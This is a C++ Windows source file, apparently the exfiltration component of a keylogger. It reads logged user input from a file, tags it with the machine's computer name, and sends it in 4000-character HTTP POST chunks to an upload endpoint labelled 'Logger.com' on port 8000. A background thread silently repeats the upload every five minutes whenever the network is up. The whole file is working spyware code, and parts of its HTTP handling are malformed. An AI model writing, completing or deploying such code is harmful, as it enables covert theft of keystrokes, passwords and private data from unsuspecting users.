
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#pragma comment (lib, "ws2_32.lib") // ??
#include <WinSock2.h>
#include <sstream>
#include <stdio.h>
#include <string>
#include <stdlib.h>
#include <Windows.h>

#include "HandleUserInputs.h"

#define PORT 8000

const char szHost[] = "www.google.com";
struct in_addr addr = { 0 };

HandleUserInput* hUserInputCur;

#include <iphlpapi.h>
#pragma comment(lib, "iphlpapi.lib")

bool CheckNetworkConnection() {
	ULONG flags = GAA_FLAG_INCLUDE_PREFIX | GAA_FLAG_INCLUDE_GATEWAYS;
	ULONG bufferLength = 0;
	PIP_ADAPTER_ADDRESSES pAddresses = NULL;

	DWORD result = GetAdaptersAddresses(AF_UNSPEC, flags, NULL, NULL, &bufferLength);
	if (result == ERROR_BUFFER_OVERFLOW) {
		pAddresses = reinterpret_cast<IP_ADAPTER_ADDRESSES*>(malloc(bufferLength));
		if (pAddresses) {
			result = GetAdaptersAddresses(AF_UNSPEC, flags, NULL, pAddresses, &bufferLength);
			if (result == ERROR_SUCCESS) {
				PIP_ADAPTER_ADDRESSES pCurrAddresses = pAddresses;
				while (pCurrAddresses) {
					if (pCurrAddresses->OperStatus == IfOperStatusUp) {
						free(pAddresses);
						return true;  // Подключение к сети найдено
					}
					pCurrAddresses = pCurrAddresses->Next;
				}
			}
			free(pAddresses);
		}
	}
	return false;  // Подключение к сети не найдено
}

void setHUserInp(HandleUserInput* hUserInp) {
	hUserInputCur = hUserInp;
}

std::string GetComputerName()
{
	wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD size = sizeof(computerName) / sizeof(computerName[0]);

	if (!GetComputerNameW(computerName, &size))
	{
		return "";
	}

	std::wstring wideComputerName(computerName);
	std::string computerNameStr(wideComputerName.begin(), wideComputerName.end());

	return computerNameStr;
}

std::string createHttpPostRequest(std::string& fileContent, int numChars) {
	std::ostringstream requestStream;
	requestStream << "POST /upload HTTP/1.1\r\n";
	requestStream << "Host: Logger.com\r\n";
	requestStream << "Content-Type: text/plain\r\n";
	requestStream << "Content-Length: " << std::to_string(numChars) << "\r\n";
	requestStream << "\r\n";
	requestStream << "Computer-Name: " << GetComputerName();
	requestStream << "\r\n";
	requestStream << fileContent.substr(0,numChars);

	// Удаление уже записанных символов из fileContent
	int prevLength = fileContent.length();
	fileContent = fileContent.substr(numChars);
	//fileContent = fileContent.substr(numChars, fileContent.length());


	return requestStream.str();
}

int mainNetwork() {

	//Init WINSOCK
	WSAData wsaData;
	WORD DLLVersion = MAKEWORD(2, 1);
	if (WSAStartup(DLLVersion, &wsaData) != 0)
		//ExitProcess(EXIT_FAILURE);
		return -1;


	//Create Socket
	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0)
		//ExitProcess(EXIT_FAILURE);
		return -1;


	//Get server info
	HOSTENT* host = gethostbyname(szHost); // here may be by addr
	addr.s_addr = inet_addr("127.0.0.1");
	host = gethostbyaddr((char*) &addr, sizeof(addr), AF_INET);
	if (host == nullptr)
		//ExitProcess(EXIT_FAILURE);
		return -1;

	//Define server info
	SOCKADDR_IN sockadrIN;
	ZeroMemory(&sockadrIN, sizeof(sockadrIN));
	sockadrIN.sin_port = htons(PORT);
	sockadrIN.sin_family = AF_INET;
	memcpy(&sockadrIN.sin_addr.S_un.S_addr, host->h_addr_list[0], sizeof(sockadrIN.sin_addr.S_un.S_addr));

	//Connect to server
	if (connect(sock, (const sockaddr*)&sockadrIN, sizeof(sockadrIN)) != 0)
		//ExitProcess(EXIT_FAILURE);
		return -1;


	WCHAR* fileContent = nullptr;
	int readSymbols = hUserInputCur->ReadTextFromFile(fileContent);
	std::string utfFile = hUserInputCur->ConvertWideStringToUTF8(fileContent);

	int currentLength = utfFile.length();
	while (currentLength > 4000)
	{
		std::string httpRequest = createHttpPostRequest(utfFile, 4000);
		currentLength -= 4000;
		if (!send(sock, httpRequest.c_str(), httpRequest.length(), 0))
			//ExitProcess(EXIT_FAILURE);
			return -1;

	}
	//const char szMsg[] = "POST / HTTP/1.1\r\n\r\n";
	std::string httpRequest = createHttpPostRequest(utfFile, currentLength);
	if (!send(sock, httpRequest.c_str(), httpRequest.length(), 0))
		//ExitProcess(EXIT_FAILURE);
		return -1;


	//char szBuffer[4096] = "";
	//char szTemp[4096] = "";
	//int bytesReceived = 0;
	//while ((bytesReceived = recv(sock, szTemp, 4096, 0)) > 0) {
	//	szTemp[bytesReceived] = '\0';  // Добавляем символ конца строки
	//	strcat(szBuffer, szTemp);
	//}

	//printf("%s\n", szBuffer);

	delete[] fileContent;
	closesocket(sock);
	//ExitProcess(EXIT_SUCCESS);
}

DWORD WINAPI senderLoop(LPVOID lpParam)
{
	while (true)
	{
		// Проверка наличия подключения к сети
		bool isConnected = CheckNetworkConnection();

		if (isConnected) {
			mainNetwork();
		}
		Sleep(5 * 60 * 1000);
	}
}